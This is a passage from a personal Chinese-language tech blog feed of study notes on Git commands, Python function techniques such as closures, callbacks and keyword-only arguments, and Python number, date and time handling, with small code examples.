<h2 id="版本回退"><a href="#版本回退" class="headerlink" title="版本回退"></a>版本回退</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">git log # 查看历史记录，显示最近到最远的提交日志</div><div class="line">git log --pretty=oneline # 只输出一条必要信息</div><div class="line"># HEAD表示当前版本，HEAD^表示上一个版本,HEAD^^上上一个版本，HEAD^100表示往上100个版本</div><div class="line">git reset --hard HEAD^ # 表示回退到上一个版本</div><div class="line"># 可以使用新版本的commit id号再回去，输入前几位也可以</div><div class="line">git reset --hard 326234</div><div class="line"># 下面命令记录了git的每次命令</div><div class="line">git reflog</div></pre></td></tr></table></figure>
<h2 id="工作区和暂存区"><a href="#工作区和暂存区" class="headerlink" title="工作区和暂存区"></a>工作区和暂存区</h2><p><code>git add</code>命令是把要提交的所有修改放到暂存区，<code>git commit</code>是把暂存区的所有修改提交到分支</p>
<p>每次修改，如果不add到暂存区，就不会加入到commit中</p>
<h2 id="撤销修改"><a href="#撤销修改" class="headerlink" title="撤销修改"></a>撤销修改</h2><p><code>git checkout -- file</code>可以丢弃工作区的修改，将文件在工作区的修改全部撤销，也就是将该文件回到最近一次<code>git commit</code>或者<code>git add</code>时的状态</p>
<p>如果不想要的内容已经<code>git add</code>到暂存区，但是没有提交，那么<code>git reset HEAD file</code>可以将暂存区的修改撤销掉，重新放回工作区，然后<code>git checkout -- file</code>丢弃工作区的修改</p>
<p>如果已经commit那么使用版本回退</p>
<h2 id="删除文件"><a href="#删除文件" class="headerlink" title="删除文件"></a>删除文件</h2><p>删除之后，工作区和版本库就不一致，这时候如果确实要在版本库中删除文件，那么使用<code>git rm file</code>并且<code>git commit</code></p>
<p>如果删除错了，那么从版本库中将文件恢复<code>git checkout -- file</code>，<code>git checkout</code>其实是用版本库的版本替换工作区的版本</p>
<h2 id="远程仓库"><a href="#远程仓库" class="headerlink" title="远程仓库"></a>远程仓库</h2><p>一台电脑充当服务器的角色，其他每个人都是从服务器仓库中克隆一份到自己电脑上，并且各自把自己的提交推送到服务器仓库中，也从服务器仓库中拉取别人的提交。所以完全可以自己搭建一台运行Git的服务器。</p>
<p>git支持多种协议，https，但是通过ssh支持的原生的git协议速度最快，有必要，每次都输密码真是烦。在<code>hexo</code>配置文件中<code>_config.yml</code>设置<code>deploy</code>属性，<code>repo</code>为<code>git@github.com:Microndgt/microndgt.github.io.git</code>即可。</p>
<h2 id="分支"><a href="#分支" class="headerlink" title="分支"></a>分支</h2><p><code>HEAD</code>指向的是<code>master</code>，<code>master</code>指向提交，所以<code>HEAD</code>指向的就是当前分支</p>
<p>创建一个分支后，增加了一个<code>dev</code>指针，指向与<code>master</code>相同的提交，再把<code>HEAD</code>指向<code>dev</code>，就表示当前分支在<code>dev</code>上，新提交一次，<code>dev</code>指针往前移动一步，而<code>master</code>指针不变，合并的时候把<code>master</code>指向<code>dev</code>的当前提交，就完成了合并，删除<code>dev</code>分支是把<code>dev</code>指针给删掉</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"># -b创建并且切换</div><div class="line">git checkout -b dev</div><div class="line"># 相当于以下</div><div class="line">git branch dev</div><div class="line">git checkout dev</div><div class="line"># 查看分支</div><div class="line">git branch</div><div class="line"># 切换分支</div><div class="line">git checkout master</div><div class="line"># 合并分支,合并指定分支到当前分支</div><div class="line">git merge dev</div><div class="line"># 合并完成后，删除dev分支</div><div class="line">git branch -d dev</div></pre></td></tr></table></figure>
<h2 id="解决冲突"><a href="#解决冲突" class="headerlink" title="解决冲突"></a>解决冲突</h2><p>就是自己之前考虑的情况，这种情况如果是两个分支修改的文件各不相同就可以自动merge，没有冲突，但是如果修改了一个文件的话，就会产生冲突，就不能快速合并，必须解决冲突之后才能合并，可以使用<code>git status</code>来查看冲突文件，解决冲突之后<code>git merge feature1</code>，然后删除<code>feature1</code>分支,<code>git branch -d feature1</code></p>
<h2 id="非快速合并分支"><a href="#非快速合并分支" class="headerlink" title="非快速合并分支"></a>非快速合并分支</h2><p>通常分支合并会使用<code>Fast forward</code>，这种模式下，删除分支后，会丢掉分支信息，强制禁用<code>Fast forward</code>，就会在<code>merge</code>生成一个新的commit，这样在分支历史上就可以看出分支信息。</p>
<p>合并的时候指定<code>--no-ff</code>参数<code>git merge --no-ff -m &quot;merge with no-ff&quot; dev</code>，因为本次合并要创建一个新的commit，所以加上<code>-m</code>参数，把commit描述写进去</p>
<h2 id="分支策略"><a href="#分支策略" class="headerlink" title="分支策略"></a>分支策略</h2><p>一般是<code>master</code>分支非常稳定，仅用来发布新版本，平时在<code>dev</code>分支干活，如果1.0版本发布的时候，再把<code>dev</code>分支合并到<code>master</code>上，在<code>master</code>分支发布1.0版本</p>
<p>然后团队每个人在<code>dev</code>分支上干活，每个人都有自己的分支，时不时往<code>dev</code>分支上合并即可。</p>
<p>我打算是<code>master</code>作为主分支，然后建立一个<code>dev</code>分支，我在这个上面干活，然后其他人就建立自己的分支，然后我来从<code>dev</code>分支合并他们的分支，然后每次稳定版本发布再合并到<code>master</code></p>
<h2 id="Feature分支"><a href="#Feature分支" class="headerlink" title="Feature分支"></a>Feature分支</h2><p>每添加一个新功能的时候，最好新建一个feature分支，在上面开发，如果完成，合并，最后删除该feature分支，如果新功能要取消，就可以销毁掉这个分支<code>git branch -D feature-vulcan</code></p>
<h2 id="多人协作"><a href="#多人协作" class="headerlink" title="多人协作"></a>多人协作</h2><p>git中，分支完全可以自己本地搞，推送的时候推送合并后的主分支好了。所以开发的时候，现在可以创建一个新分支，然后开发，最后合并删除即可，再推送。</p>
<p>如果别人clone，默认只能看到<code>master</code>分支，那么要用其他分支，必须创建远程<code>origin</code>的<code>dev</code>分支到本地，<code>git checkout -b dev origin/dev</code>，如果别人更新了仓库，那么可以<code>git pull</code>然后再本地合并，解决冲突，再推送，但是必须指定本地分支与远程分支进行链接<code>git branch --set-upstream dev origin/dev</code></p>
<p>查看远程库信息<code>git remote -v</code></p>
<h2 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h2><p><code>git tag -a v0.1 -m &quot;version 0.1 released&quot;</code></p>
<h1 id="专业素养"><a href="#专业素养" class="headerlink" title="专业素养"></a>专业素养</h1><p>不仅需要写程序，还要写文档，写注释，单元测试，这里自己还欠缺的能力是单元测试，有时间去研究学习一下。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;算法与数据结构&quot;&gt;&lt;a href=&quot;#算法与数据结构&quot; class=&quot;headerlink&quot; title=&quot;算法与数据结构&quot;&gt;&lt;/a&gt;算法与数据结构&lt;/h1&gt;&lt;p&gt;&lt;code&gt;list, tuple, set&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&quot;fronzens
    
    </summary>
    
      <category term="Python" scheme="http://microndgt.github.io/categories/Python/"/>
    
    
      <category term="编程" scheme="http://microndgt.github.io/tags/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="Python" scheme="http://microndgt.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Python函数</title>
    <link href="http://microndgt.github.io/2017/01/23/Python%E5%87%BD%E6%95%B0/"/>
    <id>http://microndgt.github.io/2017/01/23/Python函数/</id>
    <published>2017-01-23T06:34:34.000Z</published>
    <updated>2017-01-27T05:20:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>默认参数，任意数量参数，强制关键字参数，注解和闭包。</p>
<h1 id="可接受任意数量参数的函数"><a href="#可接受任意数量参数的函数" class="headerlink" title="可接受任意数量参数的函数"></a>可接受任意数量参数的函数</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">def avg(first, *rest):</div><div class="line">    # 传入相当于一个序列</div><div class="line">    return (first + sum(rest)) / (1 + len(rest))</div></pre></td></tr></table></figure>
<p>任意数量的关键字参数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">def make_element(name, value, **attrs):</div><div class="line">    keyvals = [&apos; %s = &quot;%s&quot; &apos; % item for item in attrs.items()]</div></pre></td></tr></table></figure>
<p>任意数量的位置参数和关键字参数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">def anyargs(*args, **kwargs):</div><div class="line">    print(args)</div><div class="line">    print(kwargs)</div></pre></td></tr></table></figure>
<h1 id="强制关键字参数"><a href="#强制关键字参数" class="headerlink" title="强制关键字参数"></a>强制关键字参数</h1><p>将强制关键字参数放到某个<em>参数，或者单个</em>后面就可以</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">def recv(maxsize, *, block):</div><div class="line">    pass</div><div class="line">recv(1024, block=True)</div><div class="line">def mininum(*values, clip=None):</div><div class="line">    pass</div><div class="line">mininum(1, 5, 2, clip=0)</div></pre></td></tr></table></figure>
<p>使用强制关键字参数可以使得对调用者友好，并且也比<code>**kwargs</code>友好，因为help输出的时候更容易理解</p>
<h1 id="给函数参数增加元信息"><a href="#给函数参数增加元信息" class="headerlink" title="给函数参数增加元信息"></a>给函数参数增加元信息</h1><p>增加额外信息，这样使用者就知道函数应该怎样使用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">def add(x:int, y:int) -&gt; int:</div><div class="line">    return x + y</div></pre></td></tr></table></figure>
<p>并不会类型检查，一般加上简单的注解，通常使用类或者字符串会更好</p>
<h1 id="定义有默认参数的函数"><a href="#定义有默认参数的函数" class="headerlink" title="定义有默认参数的函数"></a>定义有默认参数的函数</h1><p>定义一个有可选参数的函数直接在函数定义中给参数指定一个默认值，并且放到参数列表最后就可以了。</p>
<p>如果默认参数是一个可以修改的容器比如列表，使用None作为默认值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">def spam(a, b=None):</div><div class="line">    if b is None:</div><div class="line">        b = []</div></pre></td></tr></table></figure>
<p>默认值仅仅在函数定义的时候赋值一次，默认参数的值应该是不可变的对象，并且在测试None值的时候使用is操作符。<code>if a is None:</code></p>
<h1 id="匿名函数捕获变量值"><a href="#匿名函数捕获变量值" class="headerlink" title="匿名函数捕获变量值"></a>匿名函数捕获变量值</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">x = 10</div><div class="line">a = lambda y: x + y</div><div class="line">x = 20</div><div class="line">b = lambda y: x + y</div></pre></td></tr></table></figure>
<p><code>a(10)</code>和<code>b(10)</code>的结果都是30，因为lambda表达式中x是一个自由变量，在运行的时候绑定值，也就是说，在调用lambda表达式的时候，x的值是执行时的值，和函数的默认参数定义是不一样的。</p>
<p>如果想让某个匿名函数在定义的时候捕获到值，可以将那个参数值定义成默认参数</p>
<p><code>a = lambda y, x=x: x + y</code></p>
<h1 id="减少可调用对象的参数个数"><a href="#减少可调用对象的参数个数" class="headerlink" title="减少可调用对象的参数个数"></a>减少可调用对象的参数个数</h1><p>有一个被其他python代码使用的callable对象，可能是一个回调函数或者是一个处理器，但是参数过多的时候，可能导致调用出错。对这就是为什么我的多进程调用没有作用，可能这个是一方面原因，另外一方面原因就是传入的是可变对象。</p>
<p>使用<code>functools.partial()</code>允许给一个或者多个参数设置固定的值，减少接下来被调用时候的参数个数。</p>
<p>一个例子，partial用来微调其他库函数所使用的回调函数的参数:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">def output_result(result, log=None):</div><div class="line">    if log is not None:</div><div class="line">        log.debug(&apos;Got: %r&apos;, result)</div><div class="line">def add(x, y):</div><div class="line">    return x + y</div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">    import logging</div><div class="line">    from multiprocessing import Pool</div><div class="line">    from functools import partial</div><div class="line">    logging.basicConfig(level=logging.DEBUG)</div><div class="line">    log = logging.getLogger(&apos;test&apos;)</div><div class="line">    p = Pool()</div><div class="line">    p.apply_async(add, (3, 4), callback=partial(outoutput_result, log=log))</div><div class="line">    p.close()</div><div class="line">    p.join()</div></pre></td></tr></table></figure>
<h1 id="将单方法的类转换成函数"><a href="#将单方法的类转换成函数" class="headerlink" title="将单方法的类转换成函数"></a>将单方法的类转换成函数</h1><p>可以使用闭包将单个方法的类转换成函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">from urllib.request import urlopen</div><div class="line">class UrlTemplate:</div><div class="line">    def __init__(self, template):</div><div class="line">        self.template = template</div><div class="line">    def open(self, **kwargs):</div><div class="line">        return urlopen(self.template.format_map(kwargs))</div></pre></td></tr></table></figure>
<p>可以使用闭包来代替:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">def urltemplate(template):</div><div class="line">    def opener(**kwargs):</div><div class="line">        return urlopen(template.format_map(kwargs))</div><div class="line">    return opener</div></pre></td></tr></table></figure>
<p>经典啊！使用单方法类的原因是需要存储某些额外的状态来给方法使用，但是使用内部函数或者闭包更优雅，一个闭包就是一个函数，只不过在函数内部带上了一个额外的变量环境。闭包关键特点是它会记住自己被定义时的环境。</p>
<p>任何时候遇到需要给某个函数增加额外的状态信息的问题，都可以考虑使用闭包。</p>
<h1 id="带额外状态信息的回调函数"><a href="#带额外状态信息的回调函数" class="headerlink" title="带额外状态信息的回调函数"></a>带额外状态信息的回调函数</h1><p>代码需要依赖到回调函数的使用，并且需要让回调函数拥有额外的状态值，以便在它的内部使用。</p>
<p>回调函数的使用，仅仅接受一个参数，不能再传入其他信息。</p>
<p>为了让回调函数访问外部信息，一种方法是使用绑定方法来代替一个简单函数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">class ResultHandler:</div><div class="line">    def __init__(self):</div><div class="line">        self.sequence = 0</div><div class="line">    def handler(self, result):</div><div class="line">        self.sequence += 1</div><div class="line">        print(self.sequence, result)</div></pre></td></tr></table></figure>
<p>先创建实例，然后使用它的handler()绑定方法作为回调函数</p>
<p><code>apply_async(add, (2, 3), callback=r.handler)</code></p>
<p>可以使用闭包捕获状态值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">def make_handler():</div><div class="line">    sequence = 0</div><div class="line">    def handler(result):</div><div class="line">        nonlocal sequence</div><div class="line">        sequence += 1</div><div class="line">        print(sequence, result)</div><div class="line">    return handler</div></pre></td></tr></table></figure>
<p>使用协程来储存状态值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">def make_handler():</div><div class="line">    sequence = 0</div><div class="line">    while True:</div><div class="line">        result = yield</div><div class="line">        sequence += 1</div><div class="line">        print(sequence, result)</div></pre></td></tr></table></figure>
<p>使用send方法作为回调函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">handler=make_handler()</div><div class="line">next(handler) ＃必须的，走到yield</div><div class="line">apply_async(add, (2, 3), callback=handler.send)</div></pre></td></tr></table></figure>
<h1 id="访问闭包中定义的变量"><a href="#访问闭包中定义的变量" class="headerlink" title="访问闭包中定义的变量"></a>访问闭包中定义的变量</h1><p>扩展函数中的某个闭包，允许其能访问和修改函数的内部变量，通过编写访问函数并将其作为函数属性绑定到闭包上实现这个目的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">def sample():</div><div class="line">    n = 0</div><div class="line">    def func():</div><div class="line">        print(&apos;n=&apos;, n)</div><div class="line">    def get_n():</div><div class="line">        return n</div><div class="line">    def set_n(value):</div><div class="line">        nonlocal n</div><div class="line">        n = value</div><div class="line">    fuuc.get_n = get_n</div><div class="line">    func.set_n = set_n</div><div class="line">    return func</div><div class="line">f = sample()</div><div class="line">f()</div><div class="line">f.set_n(10)</div><div class="line">f.get_n()</div></pre></td></tr></table></figure>
<p>函数属性可以使用简单的方式将访问方法绑定到闭包函数上。</p>
<h1 id="内联回调函数"><a href="#内联回调函数" class="headerlink" title="内联回调函数"></a>内联回调函数</h1><p>回调函数可能会找不清楚程序控制流，所以使用内联回调函数可以看起来像一个普通的执行序列。</p>
<p>使用生成器和协程可以使得回调函数内联在某个函数中。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line">from queue import Queue</div><div class="line">from functools import wraps</div><div class="line"># 使用functools.wraps可以保证装饰器不会对被装饰函数造成影响，原函数返回内部函数，这样原函数的名字变成了内部函数，所以把原函数的名字等属性复制到内部函数中，这样的话依赖函数签名的代码就不会执行出错。</div><div class="line">class Async:</div><div class="line">    def __init__(self, func, args):</div><div class="line">        self.func = func</div><div class="line">        self.args = args</div><div class="line">def inlined_async(func):</div><div class="line">    @wraps(func)</div><div class="line">    def wrapper(*args):</div><div class="line">        # 这里相当于初始化生成器</div><div class="line">        f = func(*args)</div><div class="line">        result_queue = Queue()</div><div class="line">        result_queue.put(None)</div><div class="line">        while True:</div><div class="line">            result = result_queue.get()</div><div class="line">            try:</div><div class="line">                # 第一次发送None，作为必须的next，走到yield,下次来就会把计算结果发送过去，作为r，然后print，然后走向下一个yield</div><div class="line">                a = f.send(result)</div><div class="line">                # 返回a是Async对象，也就是yield之后的对象</div><div class="line">                apply_async(a.func, a.args, callback=result_queue.put)</div><div class="line">            except StopIteration:</div><div class="line">                break</div><div class="line">    return wrapper</div><div class="line">def add(x, y):</div><div class="line">    return x + y</div><div class="line">@inlined_async</div><div class="line">def test():</div><div class="line">    r = yield Async(add, (2, 3))</div><div class="line">    print(r)</div><div class="line">    r = yield Async(add, (&apos;hello&apos;, &apos;world&apos;))</div><div class="line">    print(r)</div><div class="line">    for n in range(10):</div><div class="line">        r = yield Async(add, (n, n))</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;默认参数，任意数量参数，强制关键字参数，注解和闭包。&lt;/p&gt;
&lt;h1 id=&quot;可接受任意数量参数的函数&quot;&gt;&lt;a href=&quot;#可接受任意数量参数的函数&quot; class=&quot;headerlink&quot; title=&quot;可接受任意数量参数的函数&quot;&gt;&lt;/a&gt;可接受任意数量参数的函数&lt;/h1
    
    </summary>
    
      <category term="Python" scheme="http://microndgt.github.io/categories/Python/"/>
    
    
      <category term="编程" scheme="http://microndgt.github.io/tags/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="Python" scheme="http://microndgt.github.io/tags/Python/"/>
    
      <category term="Python_Cookbook" scheme="http://microndgt.github.io/tags/Python-Cookbook/"/>
    
  </entry>
  
  <entry>
    <title>Python数字日期和时间</title>
    <link href="http://microndgt.github.io/2017/01/20/Python%E6%95%B0%E5%AD%97%E6%97%A5%E6%9C%9F%E5%92%8C%E6%97%B6%E9%97%B4/"/>
    <id>http://microndgt.github.io/2017/01/20/Python数字日期和时间/</id>
    <published>2017-01-20T03:20:22.000Z</published>
    <updated>2017-01-27T05:41:38.000Z</updated>
    
    <content type="html"><![CDATA[<p>执行分数，数组或者日期和时间运算，就需要更多工作，不过这里着重关注日期和时间的运算，毕竟工作上对时间处理还是比较多的。</p>
<h1 id="数字的四舍五入"><a href="#数字的四舍五入" class="headerlink" title="数字的四舍五入"></a>数字的四舍五入</h1><p><code>round(value, ndigits)</code>比如<code>round(1.231, 1)</code>为1.2，如果在中间的话，返回离它最近的偶数，1.5和2.5都会返回2，并且ndigits可以是负数，这样舍入运算作用在十位，百位和千位上。</p>
<p>如果不允许小误差，那么使用decimal模块。</p>
<h1 id="精确的浮点数运算"><a href="#精确的浮点数运算" class="headerlink" title="精确的浮点数运算"></a>精确的浮点数运算</h1><p>精确但是有性能损失，使用decimal模块</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">from decimal import Decimal</div><div class="line">a = Decimal(&apos;4.2&apos;)</div><div class="line">b = Decimal(&apos;2.1&apos;)</div><div class="line">print(a + b) # 6.3</div></pre></td></tr></table></figure>
<p>decimal可以允许你控制计算的数字位数和四舍五入运算。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"># 创建本地上下文并且更改它的设置</div><div class="line">with localcontext() as ctx:</div><div class="line">    ctx.prec = 3 # 位数</div><div class="line">print(a / b)</div></pre></td></tr></table></figure>
<p>之前遇到的情况是这样的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">nums = [1.23e+18, 1, -1.23e+18]</div><div class="line">sum(nums)</div><div class="line"># 可以使用math.fsum()提供的更精确计算能力来解决</div><div class="line">import math</div><div class="line">math.fsum(nums)</div></pre></td></tr></table></figure>
<p>处理金融数据的时候会用到decimal模块</p>
<h1 id="数字的格式化输出"><a href="#数字的格式化输出" class="headerlink" title="数字的格式化输出"></a>数字的格式化输出</h1><p>控制数字位数，对齐，千位分隔符和其他细节</p>
<p>格式化输出单个数字的时候，可以使用内置的format()函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">x = 1234.56789</div><div class="line">format(x, &apos;0.2f&apos;)</div><div class="line">format(x, &apos;&gt;10.1f&apos;) # 右对齐宽度10</div><div class="line">format(x, &apos;~10.1f&apos;) # 居中</div><div class="line">format(x, &apos;,&apos;) # 千位符</div></pre></td></tr></table></figure>
<p>指定宽度和精度的一般形式是<code>&#39;[&lt;&gt;^]?width[,]?(.digits)?&#39;</code>，同样的格式也用在字符串的format()方法中</p>
<p><code>the value is {:0,.2f}.format(x)</code></p>
<p>格式化值会根据指定数字的位数，和round函数采用同样的规则</p>
<h1 id="二八十六进制整数"><a href="#二八十六进制整数" class="headerlink" title="二八十六进制整数"></a>二八十六进制整数</h1><p><code>bin(x)</code>和<code>oct(x)</code>和<code>hex(x)</code>，如果不想显示前缀的话，使用format函数，<code>format(x, &#39;b&#39;)</code> 和 <code>format(x, &#39;o&#39;)</code>和<code>format(x, &#39;x&#39;)</code></p>
<p>将不同进制转换整数字符串，使用带有进制的int()函数<code>int(&#39;4d2&#39;, 16)</code>或者<code>int(&#39;0010&#39;, 2)</code>表示16进制，2进制</p>
<h1 id="无穷大和NaN"><a href="#无穷大和NaN" class="headerlink" title="无穷大和NaN"></a>无穷大和NaN</h1><p>使用<code>float()</code>来创建它们</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">a = float(&apos;inf&apos;)</div><div class="line">b = float(&apos;-inf&apos;)</div><div class="line">c = float(&apos;nan&apos;)</div></pre></td></tr></table></figure>
<p>使用<code>math.isinf()</code>和<code>math.isnan()</code>函数来测试值是否存在,也可以使用<code>numpy.isinf()</code>或者<code>numpy.isnan()</code></p>
<p>NaN值会在所有操作中传播，而不会产生异常</p>
<h1 id="分数运算"><a href="#分数运算" class="headerlink" title="分数运算"></a>分数运算</h1><p>fractions模块可以用来执行包含分数的数学运算</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">from fractions import Fraction</div><div class="line">a = Fraction(5, 4)</div><div class="line">b = Fraction(7, 16)</div><div class="line">print(a + b)</div><div class="line">float(a + b)</div></pre></td></tr></table></figure>
<h1 id="大型数组运算"><a href="#大型数组运算" class="headerlink" title="大型数组运算"></a>大型数组运算</h1><p>使用NumPy库，提供一个数组对象，更适合用来进行数学运算，底层实现中，NumPy数组使用了C或者Fortran语言的机制分配内存，它们是一个非常大的连续的并且由同类型数据组成的内存区域。<code>import numpy as np</code></p>
<p>同时NumPy库有矩阵对象来进行线性代数运算</p>
<h1 id="随机选择"><a href="#随机选择" class="headerlink" title="随机选择"></a>随机选择</h1><p>从一个序列中随机抽选一个元素，使用<code>random.choice()</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">import random</div><div class="line">values = [1, 2, 3, 4, 5, 6]</div><div class="line">random.choice(values)</div></pre></td></tr></table></figure>
<p>提取N个不同元素的样本来作进一步操作，<code>random.sample(values, 2)</code></p>
<p>打乱序列中元素顺序，<code>random.shuffle(values)</code>，原地修改顺序</p>
<p>生成随机整数，<code>random.randint(0, 10)</code> 包括0和10</p>
<p>生成0到1范围内均匀分布的浮点书，使用<code>random.random()</code></p>
<p>通过<code>random.seed()</code>函数修改初始化种子，<code>random.seed(12345)</code></p>
<h1 id="基本的日期与时间转换"><a href="#基本的日期与时间转换" class="headerlink" title="基本的日期与时间转换"></a>基本的日期与时间转换</h1><p>使用datetime模块，表示一个时间段，创建一个timedelta实例，<code>a = timedelta(days=2)</code></p>
<p>创建一个datetime实例<code>a = datetime(2012, 9, 23)</code></p>
<p><code>now = datetime.today()</code>，并且datetime会自动处理闰年</p>
<p>使用<code>dateutil</code>模块处理时区，模糊时间范围，节假日计算，使用<code>dateutil.relativedelta</code>来计算间距日期</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">from dateutil.relativedelta import relativedelta</div><div class="line">a = datetime(2017, 1, 21)</div><div class="line">a + relativedelta(years=-1)</div></pre></td></tr></table></figure>
<h1 id="最后一个周五的日期"><a href="#最后一个周五的日期" class="headerlink" title="最后一个周五的日期"></a>最后一个周五的日期</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">from datetime import datetime, timedelta</div><div class="line">weekdays = [&apos;Monday&apos;, &apos;Tuesday&apos;, &apos;Wednesday&apos;, &apos;Thursday&apos;,</div><div class="line">            &apos;Friday&apos;, &apos;Saturday&apos;, &apos;Sunday&apos;]</div><div class="line">def get_previous_byday(dayname, start_date=None):</div><div class="line">    if start_date is None:</div><div class="line">        start_date = datetime.today()</div><div class="line">    day_num = start_date.weekday() # 返回序号，周一是第一个0</div><div class="line">    day_num_target = weekdays.index(dayname)</div><div class="line">    # 这里因为有两种情况，一种是现在日期序号大于或者等于target的，这样直接减就好，比如周三2减去周二1等于1，说明上一个周二离现在1天</div><div class="line">    ＃ 另外一种情况是日期序号小于的，这样直接减就是负的，并且肯定是上一个星期的，但是不足7天，所以7加上这个差</div><div class="line">    days_ago = (7 + day_num - day_num_target) % 7</div><div class="line">    if days_ago == 0:</div><div class="line">        days_ago = 7</div><div class="line">    target_date = start_date - timedelta(days=days_ago)</div><div class="line">    return target_date</div></pre></td></tr></table></figure>
<p>可以使用dateutil模块中的relativedelta()函数执行同样的计算</p>
